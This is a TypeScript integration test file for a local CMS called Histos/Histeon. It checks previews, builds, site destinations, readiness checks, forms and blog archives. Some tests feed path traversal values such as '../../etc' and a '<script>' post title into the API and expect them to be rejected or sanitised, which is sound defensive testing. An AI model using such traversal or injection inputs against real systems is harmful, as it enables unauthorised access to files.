    expect((await (await fetch(`${base}/api/cms/v1/projects`, { headers })).json() as { projects: Array<{ id: string }> }).projects.map((item) => item.id)).not.toContain("3b1f0d2e-6c55-4c1a-9d9e-6a7f6f3f2a10");
    expect(await readdir(previewsRoot)).toEqual([preview.buildId]);
    expect((await readdir(path.join(dataDirectory, "histos-cms-builds"))).filter((name) => !name.startsWith("."))).toEqual([]);

    // A new address for the same preview; not for an unknown or malformed id, and only with POST.
    const again = await reopen(preview.buildId);
    expect(again.status).toBe(200);
    expect((await fetch((await again.json() as { previewUrl: string }).previewUrl)).status).toBe(200);
    expect((await reopen("00000000-0000-4000-8000-000000000000")).status).toBe(404);
    expect((await reopen("..%2F..")).status).toBe(404);
    const wrongMethod = await fetch(`${base}/api/cms/v1/prototype-previews/${preview.buildId}/preview`, { headers });
    expect(wrongMethod.status, await wrongMethod.clone().text()).toBe(405);

    // At most three on disk: the fourth check pushes the first out.
    const later = [await check(), await check(), await check()].map((item) => (item.preview as { buildId: string }).buildId);
    await vi.waitFor(async () => expect((await readdir(previewsRoot)).sort()).toEqual([...later].sort()));
    expect((await reopen(preview.buildId)).status).toBe(404);
    expect((await fetch(preview.previewUrl)).status).toBe(404);

    // An invalid prototype stays a 422 and builds nothing.
    expect((await fetch(`${base}/api/cms/v1/projects/import-prototype?check=1&preview=1`, { method: "POST", headers: { ...headers, "Content-Type": "text/html; charset=utf-8" }, body: "<!doctype html><html><body></body></html>" })).status).toBe(422);
    expect((await readdir(previewsRoot)).length).toBe(3);

    // Closing the app removes them all.
    await server.close();
    server = null;
    await expect(readdir(previewsRoot)).rejects.toMatchObject({ code: "ENOENT" });
    // Four checks with a build each: under the full suite's load they took more than the 5 s default (round 7).
  }, 30_000);

  it("un sito può essere solo la destinazione di un progetto CMS: niente build propria, niente altri progetti (E6)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, Origin: base, "Content-Type": "application/json" };
    const createProject = async (name: string) => ((await (await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name }) })).json()) as { project: { id: string } }).project.id;
    const projectId = await createProject("Destinazione propria");
    const otherId = await createProject("Altro progetto");
    const createSite = (path: string) => fetch(`${base}/api/sites`, { method: "POST", headers, body: JSON.stringify({ name: "Galleria online", source: { kind: "cms", path } }) });
    const created = await createSite(projectId);
    const body = await created.json() as { site: { id: string; source: { kind: string; label: string }; cmsProjectId?: string } };
    expect(created.status, JSON.stringify(body)).toBe(201);
    expect(body.site).toMatchObject({ source: { kind: "cms", label: "Progetto Histeon CMS" }, cmsProjectId: projectId });
    expect((await createSite("00000000-0000-4000-8000-000000000000")).status).toBe(404);
    expect((await createSite("../../etc")).status).toBe(404);
    // No build of its own: the project builds.
    const build = await fetch(`${base}/api/sites/${body.site.id}/build`, { method: "POST", headers, body: "{}" });
    expect(build.status).toBe(409);
    expect(await build.json()).toMatchObject({ code: "cms-site-build-refused" });
    // Another project cannot use it.
    const foreign = await fetch(`${base}/api/cms/v1/destinations/plan`, { method: "POST", headers, body: JSON.stringify({ destinationId: body.site.id, action: "deploy", projectId: otherId }) });
    expect(foreign.status).toBe(409);
    expect(await foreign.json()).toMatchObject({ code: "cms-destination-other-project" });
    expect((await fetch(`${base}/api/cms/v1/destinations/plan`, { method: "POST", headers, body: JSON.stringify({ destinationId: `wordpress-new:${body.site.id}`, action: "deploy", projectId: otherId }) })).status).toBe(409);
    // Its files cannot be replaced, not even at the start of an upload.
    const upload = await fetch(`${base}/api/sites/${body.site.id}/source-import`, { method: "POST", headers, body: JSON.stringify({ kind: "html", files: [{ path: "index.html", size: 10 }] }) });
    expect(upload.status).toBe(409);
    expect(await upload.json()).toMatchObject({ code: "cms-site-source-locked" });
    // A deploy whose confirmed summary named another destination stops before anything else.
    const sites = (await (await fetch(`${base}/api/bootstrap`, { headers })).json()) as { sites: Array<{ id: string; deployDestination: string }> };
    expect(sites.sites.find((site) => site.id === body.site.id)?.deployDestination).toMatch(/^cloudflare\|/u);
    const moved = await fetch(`${base}/api/sites/${body.site.id}/deploy`, { method: "POST", headers, body: JSON.stringify({ confirmed: true, expectedDestination: "ftp|sftp|altro.example|/" }) });
    expect(moved.status).toBe(409);
    expect(await moved.json()).toMatchObject({ code: "deploy-destination-changed" });
  });

  it("un guasto della build d'anteprima (disco, permessi) non rende non valido il prototipo (A2)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    await server.close();
    server = null;
    const brokenDisk: CmsBuildBundle = async () => {
      throw Object.assign(new Error("ENOSPC: no space left on device"), { code: "ENOSPC" });
    };
    await startApiServer(undefined, brokenDisk);
    if (!server) throw new Error("Server di test non riavviato.");
    const prototype = readFileSync(new URL("../../cms/test/fixtures/prototipo-esempio.html", import.meta.url));
    const response = await fetch(`${base}/api/cms/v1/projects/import-prototype?check=1&preview=1`, { method: "POST", headers: { "X-Histos-Token": server.token, Origin: base, "Content-Type": "text/html; charset=utf-8" }, body: prototype });
    const body = await response.json() as { valid: boolean; preview: { status: string; reason: string } };
    expect(response.status, JSON.stringify(body)).toBe(200);
    expect(body).toMatchObject({ valid: true, outcome: "create", preview: { status: "unavailable" } });
    expect(body.preview.reason).not.toContain("ENOSPC");
  });

  it("annulla la build alla chiusura del client e rimuove il bundle parziale", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    await server.close();
    server = null;

    let signalBuildStarted: (value: { signal: AbortSignal; outputDirectory: string }) => void = () => {};
    const buildStarted = new Promise<{ signal: AbortSignal; outputDirectory: string }>((resolve) => { signalBuildStarted = resolve; });
    const delayedBuild: CmsBuildBundle = async (options) => {
      if (!options.signal || !options.outputDirectory) throw new Error("Il job di test non ha ricevuto segnale e percorso output.");
      await mkdir(options.outputDirectory);
      await writeFile(path.join(options.outputDirectory, "partial.html"), "parziale");
      signalBuildStarted({ signal: options.signal, outputDirectory: options.outputDirectory });
      await new Promise<never>((_resolve, reject) => {
        const rejectCancelled = () => reject(new Error("bundle cancelled"));
        if (options.signal?.aborted) rejectCancelled();
        else options.signal?.addEventListener("abort", rejectCancelled, { once: true });
      });
      throw new Error("Il test non dovrebbe raggiungere questo punto.");
    };
    await startApiServer(undefined, delayedBuild);
    if (!server) throw new Error("Server di test non riavviato.");

    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Annullamento build" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const details = await fetch(projectPath, { headers });
    const home = (await details.json() as { pages: Array<{ alias: number; slug: string; headRevision: string }> }).pages.find((page) => page.slug === "home");
    if (!home) throw new Error("Home non presente nel progetto di prova.");
    const publishHome = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }) });
    expect(publishHome.status).toBe(200);

    const client = new AbortController();
    const request = fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}", signal: client.signal });
    const partialBuild = await buildStarted;
    const serverAbortObserved = new Promise<void>((resolve) => {
      if (partialBuild.signal.aborted) resolve();
      else partialBuild.signal.addEventListener("abort", () => resolve(), { once: true });
    });
    client.abort();
    await expect(request).rejects.toMatchObject({ name: "AbortError" });
    await serverAbortObserved;

    const noPartialBuild = await fetch(`${projectPath}/builds`, { headers });
    expect(await noPartialBuild.json()).toEqual({ builds: [] });
    await waitForPathRemoval(partialBuild.outputDirectory);
  });

  it("rimuove il bundle bloccato dallo scanner senza registrarlo", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    await server.close();
    server = null;
    let blockedOutputDirectory = "";
    const blockedBuild: CmsBuildBundle = async (options) => {
      if (!options.outputDirectory) throw new Error("Il job di test non ha ricevuto il percorso output.");
      blockedOutputDirectory = options.outputDirectory;
      await mkdir(blockedOutputDirectory);
      await writeFile(path.join(blockedOutputDirectory, "blocked.html"), "non pubblicabile");
      return {
        status: "blocked",
        sourceKind: "directory",
        bundlePath: blockedOutputDirectory,
        files: 1,
        pages: 1,
        assets: 0,
        totalBytes: 16,
        skipped: [],
        findings: [{ code: "test-blocked", severity: "block", file: "index.html", message: "Build bloccata nel test." }],
        manifest: {},
      };
    };
    await startApiServer(undefined, blockedBuild);
    if (!server) throw new Error("Server di test non riavviato.");

    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Build bloccata" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const details = await fetch(projectPath, { headers });
    const home = (await details.json() as { pages: Array<{ alias: number; slug: string; headRevision: string }> }).pages.find((page) => page.slug === "home");
    if (!home) throw new Error("Home non presente nel progetto di prova.");
    const publishHome = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }) });
    expect(publishHome.status).toBe(200);

    const response = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({ status: "blocked" });
    const history = await fetch(`${projectPath}/builds`, { headers });
    expect(await history.json()).toEqual({ builds: [] });
    await expect(access(blockedOutputDirectory)).rejects.toMatchObject({ code: "ENOENT" });
  });

  it("«Pronto per andare online?»: il verdetto della versione, la verifica nel browser della stessa versione e il rapporto accanto (V1.3)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const { project } = await (await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Pronto online" }) })).json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const noBuild = await fetch(`${projectPath}/admin/site-check`, { headers });
    expect(noBuild.status).toBe(409);
    const home = (await (await fetch(projectPath, { headers })).json() as { pages: Array<{ alias: number; status: string; headRevision: string }> }).pages.find((page) => page.status === "draft");
    if (!home) throw new Error("La pagina Home iniziale non è presente.");
    expect((await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }) })).status).toBe(200);
    expect((await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" })).status).toBe(200);

    // Chi usava già la rotta trova check, current e at come prima; in più il verdetto.
    const first = await (await fetch(`${projectPath}/admin/site-check`, { headers })).json() as { check: { pages: number }; current: boolean; at: string; readiness: { verdict: string; browserCheckedAt: string | null; sections: Array<{ id: string; state: string }> }; browserAvailable: boolean };
    expect(first).toMatchObject({ check: { pages: expect.any(Number) }, current: true, at: expect.any(String), browserAvailable: false });
    expect(first.readiness.verdict).not.toBe("pronto");
    expect(first.readiness.sections.map((section) => section.id)).toEqual(["links", "images", "search", "weight", "accessibility"]);
    expect(first.readiness.sections.at(-1)?.state).toBe("unchecked");
    const refused = await fetch(`${projectPath}/admin/site-check/browser`, { method: "POST", headers, body: "{}" });
    expect(refused.status).toBe(409);
    expect(await refused.json()).toMatchObject({ code: "cms-site-check-no-browser" });

    // Nell'app c'è il browser: la verifica apre le pagine della versione e il suo esito resta con lei.
    const opened: string[] = [];
    const probe: OpenPageProbe = async () => ({
      probe: async ({ url, width }) => {
        opened.push(`${new URL(url).pathname} ${width}`);
        return { width, scrollWidth: width, elements: [], violations: [{ id: "label", impact: "critical", help: "Etichette", helpUrl: "https://example.org/label", targets: ["input"] }] };
      },
      close: async () => undefined,
    });
    await server.close();
    await startApiServer(undefined, undefined, probe);
    const appHeaders = { ...headers, "X-Histos-Token": server!.token, Origin: base };
    const appPath = `${base}/api/cms/v1/projects/${project.id}`;
    const checked = await fetch(`${appPath}/admin/site-check/browser`, { method: "POST", headers: appHeaders, body: "{}" });
    const answer = await checked.json() as typeof first;
    expect(checked.status, JSON.stringify(answer)).toBe(200);
    expect(opened).toContain("/ 1440");
    expect(answer.browserAvailable).toBe(true);
    expect(answer.readiness.browserCheckedAt).toEqual(expect.any(String));
    expect(answer.readiness.sections.at(-1)).toMatchObject({ state: "warning", items: expect.arrayContaining([expect.objectContaining({ rule: "axe:label", count: 1 })]) });
    // Una lettura dopo ritrova la verifica della stessa versione.
    const again = await (await fetch(`${appPath}/admin/site-check`, { headers: appHeaders })).json() as typeof first;
    expect(again.readiness.browserCheckedAt).toBe(answer.readiness.browserCheckedAt);
    // Il rapporto sta accanto alla cartella della versione, con soli conteggi e indirizzi.
    const buildsFolder = path.join(dataDirectory, "histos-cms-builds", project.id);
    const reports = (await readdir(buildsFolder)).filter((name) => name.endsWith(".pronto.json"));
    expect(reports).toHaveLength(1);
    const saved = readFileSync(path.join(buildsFolder, reports[0]!), "utf8");
    expect(JSON.parse(saved)).toMatchObject({ version: reports[0]!.replace(/\.pronto\.json$/u, ""), browser: { opened: expect.any(Number), axe: [{ id: "label", count: 1, pages: expect.any(Array) }] } });
    expect(saved).not.toContain("Etichette");
    expect(saved).not.toContain("input");
    // Una nuova versione non eredita la verifica della precedente.
    expect((await fetch(`${appPath}/build`, { method: "POST", headers: appHeaders, body: "{}" })).status).toBe(200);
    const fresh = await (await fetch(`${appPath}/admin/site-check`, { headers: appHeaders })).json() as typeof first;
    expect(fresh.readiness.browserCheckedAt).toBeNull();
    expect(fresh.readiness.sections.at(-1)?.state).toBe("unchecked");
  });

  it("costruisce solo le pagine incluse nella versione e serve l’anteprima privata", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Build private" }) });
    const { project } = await created.json() as { project: { id: string } };
    const draftCreated = await fetch(`${base}/api/cms/v1/projects/${project.id}/pages`, { method: "POST", headers, body: JSON.stringify({ title: "Bozza esclusa" }) });
    expect(draftCreated.status).toBe(201);
    const draftPage = (await draftCreated.json() as { page: { alias: number } }).page;

    const emptyBuild = await fetch(`${base}/api/cms/v1/projects/${project.id}/build`, { method: "POST", headers, body: "{}" });
    expect(emptyBuild.status).toBe(422);
    expect(await emptyBuild.json()).toMatchObject({ code: "cms-build-no-published-pages" });

    const projectDetails = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    const home = (await projectDetails.json() as { pages: Array<{ alias: number; status: string; headRevision: string }> }).pages.find((page) => page.status === "draft");
    if (!home) throw new Error("La pagina Home iniziale non è presente.");
    const included = await fetch(`${base}/api/cms/v1/projects/${project.id}/pages/${home.alias}`, {
      method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }),
    });
    expect(included.status).toBe(200);
    expect(await included.json()).toMatchObject({ page: { status: "published" } });

    const built = await fetch(`${base}/api/cms/v1/projects/${project.id}/build`, { method: "POST", headers, body: "{}" });
    const result = await built.json() as { status: string; pages: number; files: number; previewUrl: string | null; code?: string; error?: string };
    expect(built.status, JSON.stringify(result)).toBe(200);
    expect(result).toMatchObject({ status: "ready", pages: 1 });
    expect(result.previewUrl).toContain("/__preview/");
    const savedBuilds = await fetch(`${base}/api/cms/v1/projects/${project.id}/builds`, { headers });
    expect(savedBuilds.status).toBe(200);
    const buildHistory = await savedBuilds.json() as { builds: Array<{ id: string; status: string; current: boolean; previewUrl: string | null; files: number; pages: number }> };
    const savedBuild = buildHistory.builds[0];
    expect(savedBuild).toBeDefined();
    if (!savedBuild?.previewUrl) throw new Error("La build salvata non ha rinnovato l'anteprima.");
    expect(savedBuild).toMatchObject({ id: expect.any(String), status: "ready", current: true, files: result.files, pages: 1 });
    expect(savedBuild.previewUrl).toContain("/__preview/");
    expect(await (await fetch(savedBuild.previewUrl)).text()).toContain("Home");
    await fetch(`${base}/api/cms/v1/projects/${project.id}/pages`, { method: "POST", headers, body: JSON.stringify({ title: "Nuova bozza" }) });
    const afterEdit = await fetch(`${base}/api/cms/v1/projects/${project.id}/builds`, { headers });
    expect(await afterEdit.json()).toMatchObject({ builds: [{ id: savedBuild.id, status: "ready", current: false }] });
    const preview = await fetch(result.previewUrl!);
    expect(preview.status).toBe(200);
    const html = await preview.text();
    expect(html).toContain("Home");
    expect(html).not.toContain("Bozza esclusa");
    const excluded = await fetch(new URL("bozza-esclusa/index.html", new URL("./", result.previewUrl!)));
    expect(excluded.status).toBe(404);
    expect(draftPage.alias).toBeGreaterThan(0);

    const draftPreviewResponse = await fetch(`${base}/api/cms/v1/projects/${project.id}/build`, {
      method: "POST", headers, body: JSON.stringify({ previewAlias: draftPage.alias }),
    });
    const draftPreview = await draftPreviewResponse.json() as { status: string; previewUrl: string | null; id: string };
    expect(draftPreviewResponse.status).toBe(200);
    expect(draftPreview).toMatchObject({ status: "ready" });
    expect(draftPreview.previewUrl).toContain(`/__preview/`);
    expect(draftPreview.previewUrl).toContain("bozza-esclusa/index.html");
    const draftHtml = await (await fetch(draftPreview.previewUrl!)).text();
    expect(draftHtml).toContain("Bozza esclusa");

    const publishDraftPreview = await fetch(`${base}/api/cms/v1/projects/${project.id}/publish-plan`, {
      method: "POST", headers,
      body: JSON.stringify({ buildId: draftPreview.id, targetSiteId: "123e4567-e89b-42d3-a456-426614174000" }),
    });
    expect(publishDraftPreview.status).toBe(404);
    expect(await publishDraftPreview.json()).toMatchObject({ code: "cms-build-missing" });
  });

  it("richiede endpoint e metodo nei moduli pubblicabili e segnala che il servizio non è verificato", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Moduli statici" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const details = await (await fetch(projectPath, { headers })).json() as { pages: Array<{ alias: number; slug: string; headRevision: string }> };
    const home = details.pages.find((page) => page.slug === "home");
    if (!home) throw new Error("La pagina Home iniziale non è presente.");
    const document = await (await fetch(`${projectPath}/documents/${home.alias}`, { headers })).json() as { head: string };
    const formWithoutEndpoint = '<!-- wp:xb/element {"uid":"form000001","tag":"form","attributes":{"method":"post"}} --><!-- wp:xb/element {"uid":"field00001","tag":"input","attributes":{"name":"email","type":"email"}} /--><!-- /wp:xb/element -->';
    const savedMissingAction = await fetch(`${projectPath}/documents/${home.alias}`, { method: "POST", headers, body: JSON.stringify({ head: document.head, content: formWithoutEndpoint }) });
    expect(savedMissingAction.status).toBe(200);
    const savedMissingActionBody = await savedMissingAction.json() as { head: string };
    const published = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: savedMissingActionBody.head }) });
    expect(published.status).toBe(200);
    const blocked = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    expect(blocked.status).toBe(422);
    expect(await blocked.json()).toMatchObject({ code: "cms-capability-unavailable", error: expect.stringContaining("imposta l’endpoint del modulo") });

    const formWithEndpoint = '<!-- wp:xb/element {"uid":"form000002","tag":"form","attributes":{"action":"https://forms.example/submit","method":"post"}} --><!-- wp:xb/element {"uid":"field00002","tag":"input","attributes":{"name":"email","type":"email"}} /--><!-- /wp:xb/element -->';
    const savedReady = await fetch(`${projectPath}/documents/${home.alias}`, { method: "POST", headers, body: JSON.stringify({ head: savedMissingActionBody.head, content: formWithEndpoint }) });
    expect(savedReady.status).toBe(200);
    const savedReadyBody = await savedReady.json() as { head: string };
    const republished = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: savedReadyBody.head }) });
    expect(republished.status).toBe(200);
    const buildResponse = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    const built = await buildResponse.json() as { status: string; previewUrl: string | null; findings: Array<{ code: string; severity: string; message: string }> };
    expect(buildResponse.status, JSON.stringify(built)).toBe(200);
    expect(built.status).toBe("ready");
    expect(built.findings).toContainEqual(expect.objectContaining({ code: "cms-form-endpoint-unverified", severity: "warn" }));
    expect(built.findings.find(({ code }) => code === "cms-form-endpoint-unverified")?.message).toContain("non ha contattato i servizi");
    if (!built.previewUrl) throw new Error("La build non ha prodotto un’anteprima privata.");
    const preview = await fetch(built.previewUrl);
    const html = await preview.text();
    expect(html).toContain('<form action="https://forms.example/submit" method="post">');
    expect(preview.headers.get("content-security-policy")).toContain("form-action 'none'");
  });

  it("crea tipi e record via API e renderizza query relazionali nei loop della build", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "CMS relazionale API" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const typeResponse = await fetch(`${projectPath}/types`, { method: "POST", headers, body: JSON.stringify({ key: "news", label: "Notizie", fields: [{ key: "topic", label: "Argomento", type: "text", public: true }] }) });
    expect(typeResponse.status).toBe(201);
    const taxonomyResponse = await fetch(`${projectPath}/taxonomies`, { method: "POST", headers, body: JSON.stringify({ key: "argomento", label: "Argomenti", types: ["news"] }) });
    expect(taxonomyResponse.status).toBe(201);
    const termResponse = await fetch(`${projectPath}/taxonomies/argomento/terms`, { method: "POST", headers, body: JSON.stringify({ slug: "database", label: "Database" }) });
    expect(termResponse.status).toBe(201);
    const { term } = await termResponse.json() as { term: { alias: number } };
    const recordResponse = await fetch(`${projectPath}/records`, { method: "POST", headers, body: JSON.stringify({ typeKey: "news", title: "Histeon CMS", status: "published", values: { topic: "Database SQLite" }, terms: { argomento: [term.alias] } }) });
    expect(recordResponse.status).toBe(201);
    const presetResponse = await fetch(`${projectPath}/query-presets`, { method: "POST", headers, body: JSON.stringify({ key: "recent_news", label: "Notizie recenti", typeKey: "news", limit: 3, orderBy: "title", order: "asc", expectedHead: null }) });
    expect(presetResponse.status).toBe(201);

    const projectDetails = await fetch(projectPath, { headers });
    const details = await projectDetails.json() as { pages: Array<{ id: string; alias: number; title: string; slug: string; status: "draft" | "published"; headRevision: string }> };
    const page = details.pages.find((item) => item.slug === "home");
    if (!page) throw new Error("Home non presente nel progetto di prova.");
    const document = await fetch(`${projectPath}/documents/${page.alias}`, { headers });
    const documentBody = await document.json() as { head: string };
    const content = '<!-- wp:xb/loop {"uid":"cmsloop001","source":{"kind":"preset","id":"recent_news","args":{"limit":"3"}},"as":"item"} --><!-- wp:xb/element {"uid":"cmshead001","tag":"h2"} --><!-- wp:xb/text {"uid":"cmstext001","content":"{item.title}"} /--><!-- /wp:xb/element --><!-- wp:xb/element {"uid":"cmstopic001","tag":"p"} --><!-- wp:xb/text {"uid":"cmstext002","content":"{item.topic}"} /--><!-- /wp:xb/element --><!-- /wp:xb/loop -->';
    const saved = await fetch(`${projectPath}/documents/${page.alias}`, { method: "POST", headers, body: JSON.stringify({ head: documentBody.head, content }) });
    expect(saved.status).toBe(200);
    const savedBody = await saved.json() as { head: string; content: string };
    expect(savedBody.content).toContain("recent_news");
    const rendered = await fetch(`${projectPath}/render`, { method: "POST", headers, body: JSON.stringify({ post_id: page.alias, content: savedBody.content }) });
    const renderBody = await rendered.json() as { html?: string; error?: string };
    expect(rendered.status, JSON.stringify(renderBody)).toBe(200);
    expect(renderBody.html).toContain("Histeon CMS");
    const pageMetadata = await fetch(`${projectPath}/pages/${page.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: savedBody.head }) });
    expect(pageMetadata.status).toBe(200);

    const built = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    const buildBody = await built.json() as { status: string; previewUrl?: string | null; findings?: Array<{ message: string }>; contentRoutes?: number };
    expect(built.status, JSON.stringify(buildBody.findings)).toBe(200);
    expect(buildBody.status, JSON.stringify(buildBody.findings)).toBe("ready");
    expect(buildBody.previewUrl).toBeTruthy();
    const preview = await fetch(buildBody.previewUrl!);
    const html = await preview.text();
    expect(preview.status).toBe(200);
    expect(html).toContain("Histeon CMS");
    expect(html).toContain("Database SQLite");
    expect(buildBody.contentRoutes).toBe(3);
    const recordPage = await fetch(new URL("news/histeon-cms/index.html", new URL("./", buildBody.previewUrl!)));
    expect(recordPage.status).toBe(200);
    const recordHtml = await recordPage.text();
    expect(recordHtml).toContain("<dd>Database SQLite</dd>");
    expect(recordHtml).toContain("/argomento/database/");
    const archivePage = await fetch(new URL("news/index.html", new URL("./", buildBody.previewUrl!)));
    expect(archivePage.status).toBe(200);
    expect(await archivePage.text()).toContain("/news/histeon-cms/");
    const taxonomyPage = await fetch(new URL("argomento/database/index.html", new URL("./", buildBody.previewUrl!)));
    expect(taxonomyPage.status).toBe(200);
    expect(await taxonomyPage.text()).toContain("Histeon CMS");
  });

  it("costruisce articoli, elenco /blog/, archivi di categorie e tag e usa i ruoli dei template", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Blog Histeon" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    for (const [key, label] of [["category", "Categorie"], ["post_tag", "Tag"]] as const) {
      const taxonomy = await fetch(`${projectPath}/taxonomies`, { method: "POST", headers, body: JSON.stringify({ key, label, types: ["post"] }) });
      expect(taxonomy.status).toBe(201);
    }
    const refused = await fetch(`${projectPath}/taxonomies`, { method: "POST", headers, body: JSON.stringify({ key: "category", label: "Categorie", types: ["news"] }) });
    expect(refused.status).toBe(400);
    const category = await (await fetch(`${projectPath}/taxonomies/category/terms`, { method: "POST", headers, body: JSON.stringify({ slug: "notizie", label: "Notizie" }) })).json() as { term: { id: string } };
    const tag = await (await fetch(`${projectPath}/taxonomies/post_tag/terms`, { method: "POST", headers, body: JSON.stringify({ slug: "sicurezza", label: "Sicurezza" }) })).json() as { term: { id: string } };

    const template = async (ref: string, title: string, marker: string, role: string, extra = "") => {
      const response = await fetch(`${projectPath}/templates`, { method: "POST", headers, body: JSON.stringify({ ref, title }) });
      expect(response.status, await response.clone().text()).toBe(201);
      const info = await response.json() as { id: number; head: string };
      const content = `<!-- wp:xb/element {"uid":"${marker}main","tag":"article"} --><!-- wp:xb/element {"uid":"${marker}head","tag":"p"} --><!-- wp:xb/text {"uid":"${marker}text","content":"${marker}: {page.title}${extra}"} /--><!-- /wp:xb/element --><!-- wp:xb/slot {"uid":"${marker}slot","name":"default"} /--><!-- /wp:xb/element -->`;
      const saved = await fetch(`${projectPath}/documents/${info.id}`, { method: "POST", headers, body: JSON.stringify({ head: info.head, content }) });
      expect(saved.status, await saved.clone().text()).toBe(200);
      const assigned = await fetch(`${projectPath}/templates/${info.id}/role`, { method: "PUT", headers, body: JSON.stringify({ role }) });
      expect(assigned.status).toBe(200);
      return info.id;
    };
    const singleAlias = await template("blog-single", "Articolo", "tplsingle", "single", " [{page.image.url}|{page.image.alt}]");
    await template("blog-missing", "Non trovato", "tplmissing", "404");
    await template("blog-tag", "Tag", "tpltagarc", "tag");
    const duplicate = await fetch(`${projectPath}/templates`, { method: "POST", headers, body: JSON.stringify({ ref: "blog-other", title: "Altro" }) });
    const other = await duplicate.json() as { id: number };
    expect((await fetch(`${projectPath}/templates/${other.id}/role`, { method: "PUT", headers, body: JSON.stringify({ role: "single" }) })).status).toBe(409);
    expect((await fetch(`${projectPath}/templates/${other.id}/role`, { method: "PUT", headers, body: JSON.stringify({ role: "author" }) })).status).toBe(400);
    expect(singleAlias).toBeGreaterThan(0);

    const postResponse = await fetch(`${projectPath}/posts`, { method: "POST", headers, body: JSON.stringify({ title: "Primo articolo <script>" }) });
    expect(postResponse.status).toBe(201);
    const { post } = await postResponse.json() as { post: { alias: number; headRevision: string; slug: string } };
    expect(post.slug).toBe("primo-articolo-script");
    const badDate = await fetch(`${projectPath}/posts/${post.alias}`, { method: "PATCH", headers, body: JSON.stringify({ head: post.headRevision, status: "published", publishedAt: "2026-02-30T10:00:00Z" }) });
    expect(badDate.status).toBe(400);
    // Doc 23 item 119: the featured image, an image of the project's media.
    const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/pF8AAAAASUVORK5CYII=", "base64");
    const uploaded = await fetch(`${projectPath}/media?filename=copertina.png`, { method: "POST", headers: { ...headers, "Content-Type": "image/png" }, body: png });
    expect(uploaded.status).toBe(201);
    const coverId = (await uploaded.json() as { asset_id: string }).asset_id;
    const badImage = await fetch(`${projectPath}/posts/${post.alias}`, { method: "PATCH", headers, body: JSON.stringify({ head: post.headRevision, status: "draft", imageAssetId: "copertina" }) });
    expect(badImage.status).toBe(400);
    const published = await fetch(`${projectPath}/posts/${post.alias}`, { method: "PATCH", headers, body: JSON.stringify({ head: post.headRevision, status: "published", publishedAt: "2026-10-25T10:00:00Z", excerpt: "Un riassunto <b>breve</b>.", imageAssetId: coverId, terms: { category: [category.term.id], post_tag: [tag.term.id] } }) });
    expect(published.status, await published.clone().text()).toBe(200);
    expect(await (await fetch(`${projectPath}/admin/content/${post.alias}`, { headers })).json()).toMatchObject({ imageAssetId: coverId });
    const notAPage = await fetch(`${projectPath}/pages/${post.alias}`, { method: "PATCH", headers, body: JSON.stringify({ head: post.headRevision, status: "draft" }) });
    expect(notAPage.status).toBe(404);

    const details = await (await fetch(projectPath, { headers })).json() as { pages: Array<{ alias: number; slug: string }>; posts: Array<{ slug: string; terms: Record<string, string[]> }>; templates: Array<{ role: string | null }> };
